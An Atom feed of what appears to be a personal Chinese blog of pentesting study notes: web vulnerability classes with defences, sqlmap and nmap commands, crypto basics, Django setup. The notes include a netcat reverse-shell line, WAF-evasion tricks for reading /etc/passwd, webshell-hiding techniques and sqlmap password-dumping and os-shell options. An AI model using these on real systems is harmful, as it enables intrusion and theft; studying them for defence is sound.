<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  <subtitle>老王</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-21T13:26:16.002Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>隐身</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python</title>
    <link href="http://yoursite.com/2020/07/21/python/"/>
    <id>http://yoursite.com/2020/07/21/python/</id>
    <published>2020-07-21T12:26:50.000Z</published>
    <updated>2020-07-21T13:26:16.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="re模块函数使用和方法"><a href="#re模块函数使用和方法" class="headerlink" title="re模块函数使用和方法"></a>re模块函数使用和方法</h1><pre><code>compile(pattern，flags = 0) 使用任何可选的标记来编译正则表达式的模式，然后返回一个正则表达式对象 re 模块函数和正则表达式对象的方法 match(pattern ， string ， flags=0) 尝试使用带有可选的标记的正则表达式的模式来匹配字符串。如果匹配成功，就返回 匹配对象；如果失败，就返回 Nonesearch(pattern ， string ， flags=0) 使用可选标记搜索字符串中第一次出现的正则表达式模式。如果匹配成功，则返回匹 配对象；如果失败，则返回 None findall(pattern ， string [, flags] )① 查找字符串中所有（非重复）出现的正则表达式模式，并返回一个匹配列表 finditer(pattern ， string [, flags] )② 与 findall()函数相同，但返回的不是一个列表，而是一个迭代器。对于每一次匹配，迭 代器都返回一个匹配对象  split(pattern ， string ， max=0)③ 根据正则表达式的模式分隔符， split 函数将字符串分割为列表，然后返回成功匹配的 列表，分隔最多操作 max 次（默认分割所有匹配成功的位置） re 模块函数和正则表达式对象方法 sub(pattern ， repl ， string ， count=0) ③ 使用 repl 替换所有正则表达式的模式在字符串中出现的位置，除非定义 count，否则就 将替换所有出现的位置（另见 subn()函数，该函数返回替换操作的数目）  purge() 清除隐式编译的正则表达式模式  常用的匹配对象方法（查看文档以获取更多信息）  group(num=0) 返回整个匹配对象，或者编号为 num 的特定子组  groups(default=None) 返回一个包含所有匹配子组的元组（如果没有成功匹配，则返回一个空元组）   groupdict(default=None) 返回一个包含所有匹配的命名子组的字典，所有的子组名称作为字典的键（如果没有 成功匹配，则返回一个空字典） 常用的模块属性（用于大多数正则表达式函数的标记）   re.I、re.IGNORECASE 不区分大小写的匹配 re.L、re.LOCALE 根据所使用的本地语言环境通过\w、\W、\b、\B、\s、\S 实现匹配 re.M、re.MULTILINE ^和$分别匹配目标字符串中行的起始和结尾，而不是严格匹配整个字符串本身的起始 和结尾 re.S、rer.DOTALL “.”（点号）通常匹配除了\n（换行符）之外的所有单个字符；该标记表示“.”（点号） 能够匹配全部字符 re.X、re.VERBOSE 通过反斜线转义，否则所有空格加上#（以及在该行中所有后续文字）都被忽略，除非 在一个字符类中或者允许注释并且提高可读性 </code></pre><h2 id="使用match方法匹配字符串"><a href="#使用match方法匹配字符串" class="headerlink" title="使用match方法匹配字符串"></a>使用match方法匹配字符串</h2><pre><code>bt=&apos;bat|bet|bit&apos;m=re.match(&apos;foo&apos;,&apos;foo&apos;):  # 模式匹配字符    if m is not None: # 如果匹配成功，就输出匹配内容         m.groupm=re.search(bt,&apos;he bit me &apos;)# 通过搜索查找bit</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;re模块函数使用和方法&quot;&gt;&lt;a href=&quot;#re模块函数使用和方法&quot; class=&quot;headerlink&quot; title=&quot;re模块函数使用和方法&quot;&gt;&lt;/a&gt;re模块函数使用和方法&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;compile(pattern，flags = 0)
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>notebook</title>
    <link href="http://yoursite.com/2020/06/24/notebook/"/>
    <id>http://yoursite.com/2020/06/24/notebook/</id>
    <published>2020-06-24T11:44:37.000Z</published>
    <updated>2020-06-29T14:06:03.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻击连模型"><a href="#攻击连模型" class="headerlink" title="攻击连模型"></a>攻击连模型</h1><pre><code>侦察目标：充分利用社会工程学了解目标网络制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件传送工具：输送工具到目标的系统上触发工具：利用目标系统的应用或者操作系统漏洞，在目标系统触发工具工具运行安装木马：远程控制程序的安装，使攻击者可以长期潜伏在目标系统中建立连接 与互联网控制服务器建立c2通道执行攻击：执行所需要的攻击行为 例如偷取信息 篡改信息</code></pre><h1 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h1><p>1http请求：http请求包括 请求行 请求头 请求正文<br>2http响应：与http请求对应的是http响应，http响应也是由三部分组成，分别是响应行，响应头，和响应正文</p><h1 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h1><pre><code>1xx 提示信息，继续处理2xx 请求成功接受处理3xx 重定向4xx 客户端错误5xx 服务端错误</code></pre><h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><pre><code>HOST:用于指定请求的资源的internet主机和端口号User-agent：允许客户端将他的操作系统，浏览器和其他属性告诉服务器Referer：代表当前访问url的上一个urlCookie：一段文本 用来表示请求者的身份Range：多线程下载一定会用到这个请求头X-forward-for：他代表请求端的ip 可以有多个中间用逗号隔开Accept 用于指定客户端收那些mMIME类型的消息Accept-Charset：用于指定客户端接收的字符集</code></pre><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><pre><code>serverr：服务器所使用web服务器的名词 避免攻击者探测可修改此头set-cookie：向客户端设置cookie Last-Modified:浏览器通过此头告诉浏览器最后资源修改时间Location：服务器告诉浏览器要去访问那个页面 配合302使用refresh 告诉浏览器定时刷新浏览器</code></pre><h1 id="实体头常用实体头"><a href="#实体头常用实体头" class="headerlink" title="实体头常用实体头"></a>实体头常用实体头</h1><pre><code>Content-Type 实体报头域用语指明发送给接收者的实体正文的媒体类型Content-Length 实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字表示Last-Modified </code></pre><h6 id="防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"><a href="#防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程" class="headerlink" title="防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"></a>防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程</h6><pre><code>1在服务端对所有输入数据有效性进行验证2在处理函数之前验证所有客户端提供的数据包括参数 url和http内容3验证数据类型 长度，以及合法性4使用白名单5危险字符后进行转义或者编码6避免使用动态拼接sql语句 </code></pre><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><h1 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h1><pre><code>1目录解析：在网站目录*.asp,*.asa下的任何扩展名的文件格式都会被解析成为asp并执行在目录*.asp文件下，*.txt，*.jpg,*png格式被解析成asp2文件解析：在iis6.0上 分号;后面的不解析3其他默认可执行文件格式</code></pre><h1 id="nginx-解析漏洞"><a href="#nginx-解析漏洞" class="headerlink" title="nginx 解析漏洞"></a>nginx 解析漏洞</h1><pre><code>php CGI解析漏洞在网站下建立xxx.jpg在浏览器访问http://xxx.jpg/xx.php   xxx.jpg服务器并没有意义反馈文件不存在而是请求拒绝 原因是在nginx中当发现xx.php不存在时 会去请求 xxx.jpg这就是nginx的畸形解析漏洞的利用方式空字节解析漏洞nginx在遇到00%空字节时与后端FastCGI处理不一致 导致可以把其他执行图片马http://xxxx/xx.jpg%00s.php会把他当做php来执行影响版本：nginx 0.5.*  nginx0.6.* nginx0.7&lt;=0.7.65 nginx0.8&lt;=0.8.37</code></pre><h1 id="apahce解析漏洞"><a href="#apahce解析漏洞" class="headerlink" title="apahce解析漏洞"></a>apahce解析漏洞</h1><pre><code>apache解析文件的时候是从右向左解析 比如 http://xxxxx/xx.php/xx.ras 无法解析ras 向左解析到.php </code></pre><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><pre><code>客户端绕过服务端：文件类型，文件头，文件后缀名 配合文件包含漏洞配合服务器解析漏洞cms 编辑器漏洞绕过配合操作系统文件命名规则绕过配合其他规则绕过waf绕过</code></pre><h3 id="后门隐藏与维持技巧"><a href="#后门隐藏与维持技巧" class="headerlink" title="后门隐藏与维持技巧"></a>后门隐藏与维持技巧</h3><pre><code>运维寻找shell的方式：    通过文件名 修改时间大小 文件备份比对等    webshell扫描脚本    通过Access.log访问日志发现后门所在    waf拦截 警告日志1 404页面隐藏2 变形一句话3包含 （文件，图片，错误日志）4 混淆（代码层面） （修改文件时间，文件大小伪装处理）</code></pre><h1 id="文件上传修复建议"><a href="#文件上传修复建议" class="headerlink" title="文件上传修复建议"></a>文件上传修复建议</h1><pre><code>文件扩展名白名单校验文件内容服务端检验上传文件重命名隐藏上传路径</code></pre><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><pre><code>1代码过滤不严2系统的漏洞造成命令注入（bash破壳漏洞 CVE-2014-6271）3 调用第三方组件存在代码执行漏洞    比如 wordpass处理图片的mageMagick组件    java中的命令执行漏洞    thinkphp命令执行技巧1    ls -l 使用通配符 /?in/?s -l    /???/??t/??c/p???w? 有时候waf不允许太多?号 /?in/cat /?tc/p?sswd    nc反弹shell:    nc -e /bin/bash 127.0.0.1 3737 为了避免符号。可以将ip地址转换成整形 127.0.0.1-&gt;2130706433技巧2 连接符    echo &apos;h&apos;ell&apos;o&apos; 要注意闭合 利用这个可以绕过一些waf的检查    检测nc /&apos;b&apos;i&apos;n&apos;/&apos;w&apos;h&apos;i&apos;ch &apos;w&apos;g&apos;e&apos;t    其他字符 双引号 反斜杠 /b\i\n/w\h\i\c\h n\c技巧3 未初始化的变量cat$a /etc$a/passwd$a    防范建议1尽量少用执行命令函数或者禁用2参数尽量使用引号包括3使用动态函数之前，确保使用的函数是指定的函数之一4对执行命令的函数方法之前对参数进行严格过滤 对敏感字符进行转义5对php来说 不能完全控制的危险函数尽量不要用    </code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><pre><code>文件包含用于绕过waf上传木马文件include和requireq区别主要是，include在包含的过程出现错误会抛出一个警告  而require函数出现错误的时候，会直接报错并退出程序include_once(),require_once()两个函数只能包含一次，用于脚本执行时用一个文件被包含超过一次的情况常见敏感文件的路径windows系统：    c:\boot.ini 查看系统版本    c:\windows\system32\inetsrv\MetaBase.xml iis配置文件    c:\ProgramFiles\mysql\data\mysql\user.MYD mysql root密码    c:\ProgramFiles\mysql\my.ini mysql配置文件linux系统    /etc/passwd &amp; /etc/shadow     /usr/local/app/apche2/conf/httpd.conf apache2默认配置文件</code></pre><p>include(“phpinfo.txt”)无论将扩张名写成什么都将以php代码执行 如果文件不符合php规则（没写<?php ?>等） 则将include可以直接输出源码<br>！文件上传后的路径一定要想办法弄到 无论是暴力猜解还是什么</p><h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><pre><code>csrf 跨站请求伪造，不攻击网站服务器而是冒充在站内的正常操作，通常由于服务端的正常操作，通常由于服务端没有对请求头进行严格过滤引起的 csrf会造成密码重置 用户伪造等</code></pre><h2 id="检测csrf"><a href="#检测csrf" class="headerlink" title="检测csrf"></a>检测csrf</h2><pre><code>1手工检测 如：http://www.test.com/test?id=1 可以删除指定用户可以编写一个POC get方式的2半自动检测 工具 CSRFTesterrr burp suite scanner模块也支持检测csrf漏洞3全自动检测 主要是插件</code></pre><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><pre><code>来源校验：referer来源用户token校验当前用户密码验证添加验证机制：比如验证码(如果不考虑用户体验的话，是最有效的)之类dvwa环境测试</code></pre><h1 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h1><pre><code>绕过1利用问号绕过限制http://www.aaa.com/abc?url=http://test.com(问号放在自身域名前面)后面的自身域名一定要带上 不带上就无法辅助问号来跳转2利用反斜杠和正斜杠绕过同样是他本身域名前加上正斜杆 然后后面跟上你要跳转的域名地址http://www.aaa.com/abc?url=http://test.com\\login.aaa.com反斜杠的三种思路 1两个反斜杠绕过方法 2一个反斜杠绕过的方法 3一个反斜杠和一个点3利用白名单绕过aaa用test.aaa可以绕过 得自己注册域名4利用@绕过url限制http://www.aaa.com/abc?url=http://login.aaa.com@test.com后面的test才是要跳转的域名 前面的域名都是辅助以绕过限制5多重验证&amp;跳转验证很多网站都有多重验证 比如登录账号后会出现另一个验证页面 此时这个url很可能存在任意跳转问题多重的 三个http:// 最后一个url可以达到任意的跳转 中间的url就没有必要动了6点击触发到绕过的url跳转限制修改了域名 点击了登录就能实现跳转7利用xip.io绕过请求时http://127.0.0.1.xip.io 这个绕过场景经常在ssrf中遇到 http://www.qq.ocm.127.0.0.1.xip.io 其实这个链接已经解析到后面的ip地址上了8利用超链接绕过可信站点限制影响较小9POST参数的url跳转利用百度等可信站点 被百度收录的站点就可以绕过10利用#号绕过http://127.0.0.1/abc？url=http://test.com#/login.aaa.com</code></pre><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><pre><code>1发现网站所提供的功能模块2针对具体的业务功能确定业务的流程3拦截http/https请求分析其参数项的含义4修改参数值，尝试触发逻辑漏洞5返回第二步骤，其其他功能继续测试</code></pre><h2 id="水平越权：没有对user检查直接接收数据查询-可能存在增，删，改，查详情，导出等功能"><a href="#水平越权：没有对user检查直接接收数据查询-可能存在增，删，改，查详情，导出等功能" class="headerlink" title="水平越权：没有对user检查直接接收数据查询 可能存在增，删，改，查详情，导出等功能"></a>水平越权：没有对user检查直接接收数据查询 可能存在增，删，改，查详情，导出等功能</h2><h2 id="垂直越权-系统设置时没有对系统角色做最小权限访问控制-任何一角色用户进行比自己权限更高的操作-这就是垂直越权"><a href="#垂直越权-系统设置时没有对系统角色做最小权限访问控制-任何一角色用户进行比自己权限更高的操作-这就是垂直越权" class="headerlink" title="垂直越权 系统设置时没有对系统角色做最小权限访问控制 任何一角色用户进行比自己权限更高的操作 这就是垂直越权"></a>垂直越权 系统设置时没有对系统角色做最小权限访问控制 任何一角色用户进行比自己权限更高的操作 这就是垂直越权</h2><h3 id="密码找回逻辑-验证码泄露，认证绕过-越权等问题"><a href="#密码找回逻辑-验证码泄露，认证绕过-越权等问题" class="headerlink" title="密码找回逻辑 验证码泄露，认证绕过 越权等问题"></a>密码找回逻辑 验证码泄露，认证绕过 越权等问题</h3><h3 id="支付逻辑-1修改支付价格-2修改支付状态-3修改购买数量-4修改附属值（优惠券金额，修改积分金额，）5-修改支付接口-6多重替换支付-7重复支付-8最小额支付-9值为最大支付问题-10越权支付，11不限制试用-12修改优惠佳"><a href="#支付逻辑-1修改支付价格-2修改支付状态-3修改购买数量-4修改附属值（优惠券金额，修改积分金额，）5-修改支付接口-6多重替换支付-7重复支付-8最小额支付-9值为最大支付问题-10越权支付，11不限制试用-12修改优惠佳" class="headerlink" title="支付逻辑 1修改支付价格 2修改支付状态 3修改购买数量 4修改附属值（优惠券金额，修改积分金额，）5 修改支付接口 6多重替换支付 7重复支付 8最小额支付 9值为最大支付问题 10越权支付，11不限制试用 12修改优惠佳"></a>支付逻辑 1修改支付价格 2修改支付状态 3修改购买数量 4修改附属值（优惠券金额，修改积分金额，）5 修改支付接口 6多重替换支付 7重复支付 8最小额支付 9值为最大支付问题 10越权支付，11不限制试用 12修改优惠佳</h3><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><pre><code>验证码至少六位数字且时间限制 错误次数限制 获取次数x限制验证码放服务端执行 不返回前端若要放前端就要进行加密多步校验权限策略 cookie严格加密并与用户session绑定 采用最小权限法秘钥签名策略</code></pre><h1 id="身份验证安全"><a href="#身份验证安全" class="headerlink" title="身份验证安全"></a>身份验证安全</h1><pre><code>1暴力破解 bp htpwdScan hydra2session&amp;cookie类 会话固定攻击 利用session不变机制借他人之手获得授权3弱加密 未使用https不好利用 2前端加密 用密文去后台校验 利用 smart decode 可解</code></pre><h1 id="业务一致性安全"><a href="#业务一致性安全" class="headerlink" title="业务一致性安全"></a>业务一致性安全</h1><pre><code>1手机号篡改2邮箱或者用户3订单id修改4商品编号5用户id篡改</code></pre><h1 id="用户输入合规性"><a href="#用户输入合规性" class="headerlink" title="用户输入合规性"></a>用户输入合规性</h1><pre><code>1注入测试2xss3fuzza功能测试多一些 有可能有一个超长特殊字符串导致系统拒绝服务或者功能缺失（fuzzb不单单这一个用途）b可能会用到的工具-spike4其他用户交互的应用漏洞</code></pre><h1 id="业务数据篡改"><a href="#业务数据篡改" class="headerlink" title="业务数据篡改"></a>业务数据篡改</h1><pre><code>1金额数据篡改2商品数量篡改3最大数限制突破4本地js参数修改</code></pre><p>#密码找回漏洞<br>    1首先尝试正常密码找回流程 选择不同的找回方式 记录所有数据包<br>    2分析数据包找到敏感部分<br>    3分析后台找回机制所使用的验证手段<br>    4修改数据包验证推测</p><h1 id="业务授权安全"><a href="#业务授权安全" class="headerlink" title="业务授权安全"></a>业务授权安全</h1><pre><code>1未授权访问 指用户在没有通过认证的情况下直接访问到需要通过认证才能访问的的页面或者文本信息 将相关的页面直接复制到浏览器访问看是否成功2越权漏洞</code></pre><p>#业务流程乱序<br>    1顺序执行缺陷<br>    a部分网站逻辑可能是先a到b到c最后到d<br>    b用户控制他们给应用程序发送的每一个请求，因此能够按照顺序进行访问<br>    于是用户就从b直接进入到c 如果c是支付过程就直接买到商品 </p><h1 id="业务接口调用安全"><a href="#业务接口调用安全" class="headerlink" title="业务接口调用安全"></a>业务接口调用安全</h1><p>1重放攻击 a恶意注册 b短信炸弹<br>2内容编辑</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;攻击连模型&quot;&gt;&lt;a href=&quot;#攻击连模型&quot; class=&quot;headerlink&quot; title=&quot;攻击连模型&quot;&gt;&lt;/a&gt;攻击连模型&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;侦察目标：充分利用社会工程学了解目标网络
制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://yoursite.com/2020/06/16/sqlmap/"/>
    <id>http://yoursite.com/2020/06/16/sqlmap/</id>
    <published>2020-06-16T14:03:18.000Z</published>
    <updated>2020-06-19T14:24:03.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap入门"><a href="#sqlmap入门" class="headerlink" title="sqlmap入门"></a>sqlmap入门</h1><p>判断是否存在注入：sqlmap.py -u <a href="http://127.0.0.1……（当注入参数大大于2">http://127.0.0.1……（当注入参数大大于2</a> 式需要加双引号）<br>从文件中加载http参数：sqlmap.py -r desktop/1.txt sqlmap.py -r desktop/1.txt<br>查询当前用户所有数据库 sqlmap.py -u <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> –dbs<br>获取数据库的表名 sqlmap.py -u http:// -D dkeye –tables (-d指定数据库)<br>查询表中字段名字 sqlmap.py -u <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> -D XX -T XX –columns （columns可以写成-c）<br>查询数据库中所有用户 sqlmap.py -u “<a href="http://127.0.0.1&quot;" target="_blank" rel="noopener">http://127.0.0.1&quot;</a> –users<br>查询数据库中用户密码 sqlmap.py -u “<a href="http://127.0.0.1&quot;" target="_blank" rel="noopener">http://127.0.0.1&quot;</a> –password</p><h1 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h1><p>–level 5 指定需要测试的等级 一共5个等级 等级2时候测试coookie 等级3测试http头<br>–is-dba 查看当前用户是否为管理员用户<br>–roles: 列出管理员角色<br>–referer 伪造http referer头<br>–os-cmd,–os-shell 运行任意操作系统命令<br>–file-read 从数据库中读取文件<br>–file-write –file-dest 上传文件到数据库服务器中<br>–identify-waf 测试网站WAF</p><h1 id="sql自带tamper脚本"><a href="#sql自带tamper脚本" class="headerlink" title="sql自带tamper脚本"></a>sql自带tamper脚本</h1><p>sqlmap.py xxxxxxx –tamper “模块名”<br>apostrophemask.py        作用：将引号替换成utf8 用于过滤单引号<br>base64encode.py        作用：base64编码<br>multiplespaces.py      作用： 围绕sql关键字加多个空格<br>space2plus.py         作用：用+号替代空格<br>nonrecursivereplacement.py 作用：双写绕过waf<br>space2randomblank.py 作用：将空格替换成其他有效字符<br>unionalltounion.py    作用：union all select 替换成 union select<br>securesphere.py       作用：追加特定的字符串<br>space2hash.py         作用：将空格替换成#号<br>space2mssqlblank.py(mysql)将空格替换成其他符号<br>space2mssqlhash.py         作用：将空格替换成#号<br>between.py                     作用：替换&gt;号<br>percentage.py                 asp允许每个字符前加%号<br>sp_password.py              作用：从DBMS日志自动模糊处理有效的载荷中追加password<br>charencode.py                作用：给payload全部字符使用url编码<br>randomcase.py                 作用：随机大小写<br>charunicodeencode.py         作用：字符串unicode编码<br>spac2comment.py                 作用：将空格替换成/**/<br>equaltolike.py                  作用：将等号替换成like<br>greatest.py                     作用：对&gt;号进行绕过<br>ifnull2ifisnull.py                 作用：绕过对IFUNLL的过滤<br>modsecurityversioned.py           作用：过滤空格 使用内联注释<br>space2mysqlblank.py             作用：将空格替换成其他空白符合适合mysql<br>modsecurityzeroversioned.py      作用：使用mysql内联注释进行注入<br>space2mysqldash.py                 作用：将空格替换成– 并添加一个换行符 </p><p>bluecoat.py                      作用：在有效的随机空白符替换成空格符<br>versionedkeywords.py              作用： 注入绕过<br>halfversionedmorekeywords.py      作用：当数据库为mysql时绕过防火墙<br>space2morehash.py                    作用：将空格代替成引号，并添加一个随机的字符串<br>apostrophenullencode.py            作用：使用非法双字节unicode字符替代单引号<br>appendnullbyte.py                    有效载荷的结束位置加载零字节字符编码<br>chardoubleencode.py                 作用：对给定的payload全部字符使用双重编码<br>unmagicquotes.py                     作用：用多字节组合（%bf%27）和末尾通用注释一起替换空格<br>randomcomments.py                    作用：用/**/分割关键字</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqlmap入门&quot;&gt;&lt;a href=&quot;#sqlmap入门&quot; class=&quot;headerlink&quot; title=&quot;sqlmap入门&quot;&gt;&lt;/a&gt;sqlmap入门&lt;/h1&gt;&lt;p&gt;判断是否存在注入：sqlmap.py -u &lt;a href=&quot;http://127.0.0.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>nmap</title>
    <link href="http://yoursite.com/2020/06/16/nmap/"/>
    <id>http://yoursite.com/2020/06/16/nmap/</id>
    <published>2020-06-16T05:44:53.000Z</published>
    <updated>2020-06-16T13:33:39.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h1><p>扫描单个地址  nmap 192.168.0.1<br>扫描多个目标地址 nmap 192.168.9.1 192.168.9.100<br>扫描指定范围 nmap 192.168.9.1-100<br>扫描目标地址所在某个网段 nmap 192.168.1.100/24<br>导入文件扫描 nmap -iL xx.txt<br>指定端口扫描 nmap 192.168.1.100 -p 21,22,23,80<br>对目标地址进行路由跟踪 nmap –traceroute 192.168.1.100<br>识别操作系统 nmap -O 192.168.9.100<br>服务版本的识别 nmap -sV<br>探测防火墙状态 nmap -sF -T4 192.168.9.100<br>    open 开放 外部可以访问<br>    filtered 被过滤的<br>    closed 关闭的<br>    unfiltered 未被过滤的<br>    open/filtered 开放或被过滤的 不能识别</p><p>脚本 –script<name>使用某个脚本进行扫描<br>鉴权扫描 nmap–script=auth 192.168.9.100<br>暴力破解 nmap –script=brute 192.168.9.100<br>扫描常见的漏洞 nmap –script=vuln 192.168.9.105<br>扫描服务 nmap –script=realvnc-auth-bypass 192.168.9.100<br>探测局域网内更多服务的开启 nmap -n -p 445 –script=broadcast 192.168.9.100<br>whois解析 nmap -script externalbaidu.com </p><p>nmap相关参数<br>-iL 从文件导入目标主机或者目标网段<br>-iR 随机选择目标或者网段<br>–exclude 后面跟的主机或网段将不扫瞄<br>–excludefile 文件导入的……<br>–sL列举指定目标的ip 不进行主机发现<br>-sn 只进行主机发现 不进行端口扫描<br>-Pn 将所有主机视为已开启 跳过主机发现的过程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;常用方法&quot;&gt;&lt;a href=&quot;#常用方法&quot; class=&quot;headerlink&quot; title=&quot;常用方法&quot;&gt;&lt;/a&gt;常用方法&lt;/h1&gt;&lt;p&gt;扫描单个地址  nmap 192.168.0.1&lt;br&gt;扫描多个目标地址 nmap 192.168.9.1 192.168.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>crypto</title>
    <link href="http://yoursite.com/2020/06/12/crypto/"/>
    <id>http://yoursite.com/2020/06/12/crypto/</id>
    <published>2020-06-12T00:10:19.000Z</published>
    <updated>2020-06-12T00:45:05.944Z</updated>
    
    <content type="html"><![CDATA[<p>主流的加密方式</p><h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h3 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h3><p>1单表替换密码 2多密码替代密码 3多字母表替代密码 4多表替代密码等</p><h3 id="置换位移法"><a href="#置换位移法" class="headerlink" title="置换位移法"></a>置换位移法</h3><p>1列置换   2周期置换等</p><h1 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h1><p>1对称密码 2非对称密码 3hash函数 4数字签名</p><h1 id="古典密码-1"><a href="#古典密码-1" class="headerlink" title="古典密码"></a>古典密码</h1><h3 id="古典密码编码方法归结为主要的两种-即是置换和代换"><a href="#古典密码编码方法归结为主要的两种-即是置换和代换" class="headerlink" title="古典密码编码方法归结为主要的两种 即是置换和代换"></a>古典密码编码方法归结为主要的两种 即是置换和代换</h3><p>置换： 把字母重新排列 字母身不变其他位置变了 </p><h2 id="代换：-将密码代替成其他字符"><a href="#代换：-将密码代替成其他字符" class="headerlink" title="代换： 将密码代替成其他字符"></a>代换： 将密码代替成其他字符</h2><p>多表替代密码 从明文字母到密文字母通过多个映射来隐藏字母出现的频率分布<br>代表有 维吉尼亚密码（26个凯撒密码合并成一个表）</p><h2 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h2><p>代表 栅栏密码（简单的移动字符位置的加密方法）</p><h1 id="现代密码-1"><a href="#现代密码-1" class="headerlink" title="现代密码"></a>现代密码</h1><p>对称加密（加密和解密使用同一密钥）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;主流的加密方式&lt;/p&gt;
&lt;h1 id=&quot;古典密码&quot;&gt;&lt;a href=&quot;#古典密码&quot; class=&quot;headerlink&quot; title=&quot;古典密码&quot;&gt;&lt;/a&gt;古典密码&lt;/h1&gt;&lt;h3 id=&quot;代换密码&quot;&gt;&lt;a href=&quot;#代换密码&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>django</title>
    <link href="http://yoursite.com/2020/05/26/django/"/>
    <id>http://yoursite.com/2020/05/26/django/</id>
    <published>2020-05-26T15:31:48.000Z</published>
    <updated>2020-06-21T09:24:00.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python创建虚拟环境"><a href="#python创建虚拟环境" class="headerlink" title="python创建虚拟环境"></a>python创建虚拟环境</h1><pre><code>使用清华源安装：pip install virtualenv -i https://pypi.python.org/simple/cd到存虚拟环境的地址    virtualenv -p /usr/local/bin/python2.7 ENV2 参数 -p 指定python版本创建虚拟环境virtualenv --system-site-packages ENV 参数 --system-site-packages 指定创建虚拟环境时继承系统三方库4. 激活/退出虚拟环境source bin/activate 激活虚拟环境pip list 查看当前虚拟环境下所安装的第三方库deactivate 退出虚拟环境删除虚拟环境：直接删除虚拟环境所在目录即可</code></pre><p>目录结构<br>    init.py：是一个python的包<br>    settings.py：项目的配置文件<br>    urls.py：路由配置文件<br>    wsgi.py：web服务器和Django交互入口<br>    manage.py:项目的管理文件</p><h2 id="启动django-python3-manage-py-runserver-8080"><a href="#启动django-python3-manage-py-runserver-8080" class="headerlink" title="启动django python3 manage.py runserver  8080"></a>启动django python3 manage.py runserver  8080</h2><pre><code>```bash</code></pre><h2 id="django-创建命令-python-manage-py-startapp-app-name"><a href="#django-创建命令-python-manage-py-startapp-app-name" class="headerlink" title="django 创建命令 python manage.py startapp app-name"></a>django 创建命令 python manage.py startapp app-name</h2><pre><code>init.py：python模块 migrations：储存模型类迁移文件 admin.py：后台管理文件 models.py：和数据库交互模块 tests.py：测试代码文件 views.py：接受请求，处理，与M和T进行交互，返回应答，定义处理视图函数。</code></pre><p>修改 setting.py中的INSTALLED_APPS配置项，加上刚刚创建的应用程序</p><h2 id="启动程序：python-manage-py-runserver"><a href="#启动程序：python-manage-py-runserver" class="headerlink" title="启动程序：python manage.py runserver"></a>启动程序：python manage.py runserver</h2><p>URL配置（URLconf）就像Django所支撑网站的目录。它的本质是URL与要为该URL调用的视图函数之间的映射表<br>urlpatterns = [url(r’^admin/‘, admin.site.urls),]<br>视图会返回一个HttpResponse对象，其中包含生成的响应。每个视图函数都负责返回一个HttpResponse对象。</p><h2 id="定义模型类，需要继承models-Model类"><a href="#定义模型类，需要继承models-Model类" class="headerlink" title="定义模型类，需要继承models.Model类"></a>定义模型类，需要继承models.Model类</h2><pre><code class="bash">from django.db import models</code></pre>]]></content>
    
    <summary type="html">
    
      
      
